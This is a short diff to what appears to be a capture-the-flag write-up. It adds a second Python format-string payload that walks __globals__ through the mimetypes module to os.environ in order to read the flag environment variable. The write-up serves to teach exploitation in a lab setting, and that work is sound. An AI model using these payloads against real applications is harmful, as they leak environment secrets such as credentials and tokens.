@@ -310,6 +310,8 @@ data.__init__.__globals__
 #####  mimetypes module which import os  [mimetypes](https://github.com/python/cpython/blob/3.11/Lib/mimetypes.py) (was a hint actually)
 ```python
 data.__init__.__globals__[mimetypes].os.environ[FLAG]
+or
+{data.__class__.__copy__.__globals__[mimetypes].os.environ[FLAG]}
 ```
 
 ##### finally we get the flag !!!!!!
